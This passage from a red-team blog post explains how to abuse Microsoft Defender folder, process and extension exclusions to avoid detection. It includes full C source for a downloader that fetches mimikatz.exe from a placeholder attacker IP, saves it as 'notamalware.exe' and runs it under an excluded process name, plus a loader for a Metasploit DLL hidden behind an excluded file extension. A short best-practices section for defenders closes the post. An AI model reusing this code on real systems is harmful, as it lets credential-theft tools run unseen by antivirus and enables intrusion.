</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/enumexclusionspscript.png" alt="" /></p><p>As evident from the image above, when we are trying to enumerate exclusions via <code class="language-plaintext highlighter-rouge">Get-MpPreference</code> we are getting error as we are not administrators but when using the above PowerShell script to find out the same via parsing the event logs we can get the similar results.</p><h3 id="abusing-defender-av-exclusions">Abusing Defender AV Exclusions</h3><p>Once an attacker has identified exclusions, they can be abused in various ways depending on the type of exclusion:</p><h4 id="abusing-folder-based-exclusions">Abusing Folder Based Exclusions</h4><p>Folder-based exclusions are perhaps the easiest to exploit. An attacker can simply place malicious files or execute malicious code from within the excluded folder, knowing that the AV/EDR will not scan or monitor activities in that location. An exclusion for a path can be set with the following command.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Set-MpPreference</span><span class="w"> </span><span class="nt">-ExclusionPath</span><span class="w"> </span><span class="s2">"C:\Windows\Temp"</span><span class="w">
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/Pasted image 20240811145735.png" alt="" /></p><p>After the attacker has enumerated the path where Defender AV is excluded, they can download the malicious files onto that folder and execute it from there without getting detected.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/mimikatz1.png" alt="" /></p><p>In the above image the <code class="language-plaintext highlighter-rouge">mimikatz</code> gets detected and deleted immediately after it’s downloaded to the non-excluded folder but in below image, it can be seen when doing the same in excluded folder, Defender AV becomes silent. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/mimikatz2.png" alt="" /></p><h4 id="abusing-process-based-exclusions">Abusing Process Based Exclusions</h4><p>According per Microsoft “When you add a process to the process exclusion list, Microsoft Defender Antivirus won’t scan files opened by that process, no matter where the files are located. The process itself, however, will be scanned unless it has also been added to the <a href="https://learn.microsoft.com/en-us/defender-endpoint/configure-extension-file-exclusions-microsoft-defender-antivirus">file exclusion list</a>.” - https://learn.microsoft.com/en-us/defender-endpoint/configure-process-opened-file-exclusions-microsoft-defender-antivirus</p><p>This above paragraph is pretty much explanatory. Process based exclusion can be set using the following command.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Set-MpPreference</span><span class="w"> </span><span class="nt">-ExclusionProcess</span><span class="w"> </span><span class="s2">"sqlserver.exe"</span><span class="w">
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/process1.png" alt="" /></p><p>In the above example, process based exclusion is set for “sqlserver.exe” process without absolute path. Means if sqlserver.exe is executed from anywhere on the endpoint, any activity done by it wouldn’t be scanned which also means if there’s a malicious process with same name ‘sqlserver’ all it’s malicious activity will be ignored by Defender AV.</p><p>So abusing it at first glance would look like downloading our malicious binary and renaming it to excluded process name but let’s see if that works.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/process2.png" alt="" /></p><p>In the above example, even though I downloaded mimikatz as “sqlserver.exe” which we are sure is excluded but still it was detected and deleted by Defender AV. If we recall the statement by Microsoft again “When you add a process to the process exclusion list, Microsoft Defender Antivirus won’t scan files opened by that process, no matter where the files are located. The process itself, however, will be scanned unless it has also been added to the <a href="https://learn.microsoft.com/en-us/defender-endpoint/configure-extension-file-exclusions-microsoft-defender-antivirus">file exclusion list</a>”.</p><p>In our case the process which is responsible for downloading mimikatz as sqlserver.exe is PowerShell.exe which is not excluded. If we run PowerShell.exe by renaming it to “sqlserver.exe” then the same activity won’t be detected by Defender AV. Rather let’s create a simple C code which will just download and execute the downloaded coded (in our case mimikatz)</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
</pre><td class="rouge-code"><pre><span class="c1">// gcc downloadExec.c -o downloadExec -lwininet</span>
<span class="cp">#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#include &lt;wininet.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">HINTERNET</span> <span class="n">hInternet</span><span class="p">,</span> <span class="n">hConnect</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">bytesRead</span><span class="p">;</span>

    <span class="c1">// Initialize WinINet</span>
    <span class="n">hInternet</span> <span class="o">=</span> <span class="n">InternetOpenA</span><span class="p">(</span><span class="s">"Download Example"</span><span class="p">,</span> <span class="n">INTERNET_OPEN_TYPE_DIRECT</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hInternet</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"InternetOpen failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Open a connection to the URL</span>
    <span class="n">hConnect</span> <span class="o">=</span> <span class="n">InternetOpenUrlA</span><span class="p">(</span><span class="n">hInternet</span><span class="p">,</span> <span class="s">"http://&lt;IP&gt;/mimikatz.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">INTERNET_FLAG_RELOAD</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hConnect</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"InternetOpenUrl failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternet</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Create a buffer to store the downloaded data</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>

    <span class="c1">// Open a local file for writing</span>
    <span class="kt">FILE</span><span class="o">*</span> <span class="n">outputFile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"notamalware.exe"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">outputFile</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to open output file for writing</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hConnect</span><span class="p">);</span>
        <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternet</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Read and write data until the end of the file</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">InternetReadFile</span><span class="p">(</span><span class="n">hConnect</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">bytesRead</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">bytesRead</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fwrite</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">bytesRead</span><span class="p">,</span> <span class="n">outputFile</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Clean up</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">outputFile</span><span class="p">);</span>
    <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hConnect</span><span class="p">);</span>
    <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternet</span><span class="p">);</span>

    <span class="n">STARTUPINFO</span> <span class="n">si</span><span class="p">;</span>
    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>
    <span class="n">TCHAR</span> <span class="n">szCmdline</span><span class="p">[]</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">".</span><span class="se">\\</span><span class="s">notamalware.exe"</span><span class="p">);</span> 

    <span class="c1">// Zero the structures</span>
    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">));</span>
    <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span>
    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pi</span><span class="p">));</span>

    <span class="c1">// Create a process for the executable in the current directory</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateProcess</span><span class="p">(</span>
        <span class="nb">NULL</span><span class="p">,</span>           <span class="c1">// No module name (use command line)</span>
        <span class="n">szCmdline</span><span class="p">,</span>      <span class="c1">// Command line - executable in the current directory</span>
        <span class="nb">NULL</span><span class="p">,</span>           <span class="c1">// Process handle not inheritable</span>
        <span class="nb">NULL</span><span class="p">,</span>           <span class="c1">// Thread handle not inheritable</span>
        <span class="n">FALSE</span><span class="p">,</span>          <span class="c1">// Set handle inheritance to FALSE</span>
        <span class="mi">0</span><span class="p">,</span>              <span class="c1">// No creation flags</span>
        <span class="nb">NULL</span><span class="p">,</span>           <span class="c1">// Use parent's environment block</span>
        <span class="nb">NULL</span><span class="p">,</span>           <span class="c1">// Use parent's starting directory </span>
        <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span>            <span class="c1">// Pointer to STARTUPINFO structure</span>
        <span class="o">&amp;</span><span class="n">pi</span>             <span class="c1">// Pointer to PROCESS_INFORMATION structure</span>
    <span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"CreateProcess failed (%d).</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Wait until child process exits.</span>
    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>

    <span class="c1">// Close process and thread handles. </span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</pre></table></code></div></div><p>If we run it as it is then still it’ll get detected by Defender AV as shown below. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/Pasted image 20240811160830.png" alt="" /></p><p>Now if we run it after renaming it to “sqlserver.exe”, Defender won’t catch it and our mimikatz will run. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/Pasted image 20240811161009.png" alt="" /></p><p>In my case, after few seconds, Defender AV was able to detect and delete it. However, when combining it with file based exclusion, it works smoothly.</p><h4 id="abusing-extension-based-exclusions">Abusing Extension Based Exclusions</h4><p>As this sound, in extension based exclusion, if some specific extension is excluded then that wouldn’t be scanned by the Defender AV just as shown below where there’s an exclusion for <code class="language-plaintext highlighter-rouge">.exe</code> and we are running mimikatz.exe as it is. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/extension1.png" alt="" /></p><p>But what if there’s an exclusion for non executable extension like “.txt” or any random extension like “.goku”, can it still be abused? The answer is “YES”. All we have to do is just have our malicious DLL binary to have the extension of the excluded extension and run it. The beauty about DLL files on windows is that they can technically have any extension, but they are still recognized and executed as DLLs by the operating system because of their internal structure and not solely by their file extension. When an application or system component needs to load a DLL, it uses functions like <code class="language-plaintext highlighter-rouge">LoadLibrary</code> or <code class="language-plaintext highlighter-rouge">LoadLibraryEx</code>. These functions read the PE header of the file to determine if it is a valid DLL, regardless of the file extension.</p><p>I know mimikatz can be compiled into a DLL but i was too lazy to do it so i instead used metasploit DLL for this example. If I try to download the DLL as it is then it would be caught and deleted by Defender AV. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/extension2.png" alt="" /></p><p>Now when the same metasploit DLL is downloaded and executed with the excluded extension, Defender goes silent again as shown below. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/extension3.png" alt="" /></p><p>Now what if rundll32.exe (which we used in this case to execute our DLL file) is blocked or you don’t want to use it for the reason such LOLBins are highly monitored. You can have your own DLL loader load and execute your malicious DLL as shown below.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
</span>
<span class="k">typedef</span> <span class="nf">BOOL</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">DllMainFunc</span><span class="p">)(</span><span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">fdwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpvReserved</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">;</span>
    <span class="n">DllMainFunc</span> <span class="n">DllMain</span><span class="p">;</span>

    <span class="c1">// Load the DLL</span>
    <span class="n">hinstDLL</span> <span class="o">=</span> <span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"msfmal.goku"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hinstDLL</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Could not load the DLL</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Get the address of DllMain (this is usually not done, for demonstration only)</span>
    <span class="n">DllMain</span> <span class="o">=</span> <span class="p">(</span><span class="n">DllMainFunc</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hinstDLL</span><span class="p">,</span> <span class="s">"DllMain"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">DllMain</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Could not locate the function DllMain</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">FreeLibrary</span><span class="p">(</span><span class="n">hinstDLL</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Call DllMain explicitly (for demonstration only)</span>
    <span class="n">BOOL</span> <span class="n">result</span> <span class="o">=</span> <span class="n">DllMain</span><span class="p">(</span><span class="n">hinstDLL</span><span class="p">,</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"DllMain executed successfully</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"DllMain execution failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Free the DLL module</span>
    <span class="n">FreeLibrary</span><span class="p">(</span><span class="n">hinstDLL</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/defender_av_exclusion/extension4.png" alt="" /></p><h3 id="best-practices-when-setting-exclusions">Best Practices When Setting Exclusions</h3><ul><li>Only implement exclusions when absolutely necessary and after thorough testing.<li>Prefer narrow, specific exclusions over broad ones. For example, exclude a specific file rather than an entire folder.<li>Implement a process to periodically review all exclusions and remove any that are no longer needed.<li>Implement additional monitoring and logging for areas that are excluded from AV/EDR scanning.<li>Combine exclusions with application whitelisting to ensure only approved applications can run, even in excluded areas.</ul><h3 id="conclusion">Conclusion</h3><p>AV/EDR exclusions, while necessary for system functionality, introduce silent bypass opportunities that are often overlooked in security assessments. By understanding these risks and implementing proper management and mitigation strategies, organizations can balance the need for operational efficiency with robust security practices.</p><p>As we’ve seen, the abuse of exclusions can be a powerful and stealthy technique for evading detection. It’s crucial for security professionals to be aware of this attack vector and to implement proper controls and monitoring around exclusions.</p><p>Remember, security is not about eliminating all risks, but about managing them effectively. Stay vigilant, regularly review your exclusions, and always assume that attackers are looking for these silent pathways into your systems.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/red-teaming/'>Red Teaming</a>, <a href='/categories/defense-evasion/'>Defense Evasion</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/bypass/" class="post-tag no-text-decoration" >bypass</a> <a href="/tags/defender/" class="post-tag no-text-decoration" >defender</a> <a href="/tags/exclusions/" class="post-tag no-text-decoration" >exclusions</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Abusing Exclusions To Evade Detection - Dazzy Ddos&url=https://dazzyddos.github.io/posts/Abusing_Exclusions_To_Evade_Detection/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Abusing Exclusions To Evade Detection - Dazzy Ddos&u=https://dazzyddos.github.io/posts/Abusing_Exclusions_To_Evade_Detection/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Abusing Exclusions To Evade Detection - Dazzy Ddos&url=https://dazzyddos.github.io/posts/Abusing_Exclusions_To_Evade_Detection/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/(Un)Hooking,-COWs-and-Meow-Meow/">(Un)Hooking, COWs and Meow Meow</a><li><a href="/posts/Naughty_Hooking_Detoxifying_Memory/">Naughty Hooking Detoxifying Memory Before Doing Crime</a><li><a href="/posts/Remote-Process-Enumeration-with-WTS-Set-Of-APIs/">Remote Process Enumeration with WTS Set of Windows APIs</a><li><a href="/posts/AMSI-Bypass/">Defense Evasion Series Part 1 AMSI Bypass</a><li><a href="/posts/Automating-Phishing-Infrastructure-with-terraform-on-AWS/">Automating Phishing Infrastructure with terraform on AWS</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/frida/">frida</a> <a class="post-tag" href="/tags/hooking/">hooking</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/unhooking/">unhooking</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi bypass</a> <a class="post-tag" href="/tags/av-bypass/">av bypass</a> <a class="post-tag" href="/tags/aws/">aws</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/(Un)Hooking,-COWs-and-Meow-Meow/"><div class="card-body"> <span class="timeago small" > Oct 14, 2023 <i class="unloaded">2023-10-14T03:15:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(Un)Hooking, COWs and Meow Meow</h3><div class="text-muted small"><p> Konichiwa to all my readers! Today, I’m sharing a concise blog post centered on a query that arose during a malware development training session I was conducting. This post contains my observations...</p></div></div></a></div><div class="card"> <a href="/posts/AMSI-Bypass/"><div class="card-body"> <span class="timeago small" > Aug 18, 2021 <i class="unloaded">2021-08-18T09:10:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Defense Evasion Series Part 1 AMSI Bypass</h3><div class="text-muted small"><p> Introduction Hello Folks. This is the beginning of a new blog post series on various Defense Evasion techniques. In Part 1, we will look into what is AMSI, how it works and how to bypass it. Prer...</p></div></div></a></div><div class="card"> <a href="/posts/Remote-Process-Enumeration-with-WTS-Set-Of-APIs/"><div class="card-body"> <span class="timeago small" > Dec 26, 2021 <i class="unloaded">2021-12-26T08:10:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Remote Process Enumeration with WTS Set of Windows APIs</h3><div class="text-muted small"><p> Introduction Hi All. I welcome you again. In this particular blog post we’ll code our own tool in C++ to gather information (list of running processes) from remote system. We will be assuming that...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/(Un)Hooking,-COWs-and-Meow-Meow/" class="btn btn-outline-primary" prompt="Older"><p>(Un)Hooking, COWs and Meow Meow</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/dazzyddos">dazzy</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/frida/">frida</a> <a class="post-tag" href="/tags/hooking/">hooking</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/unhooking/">unhooking</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi bypass</a> <a class="post-tag" href="/tags/av-bypass/">av bypass</a> <a class="post-tag" href="/tags/aws/">aws</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://dazzyddos.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
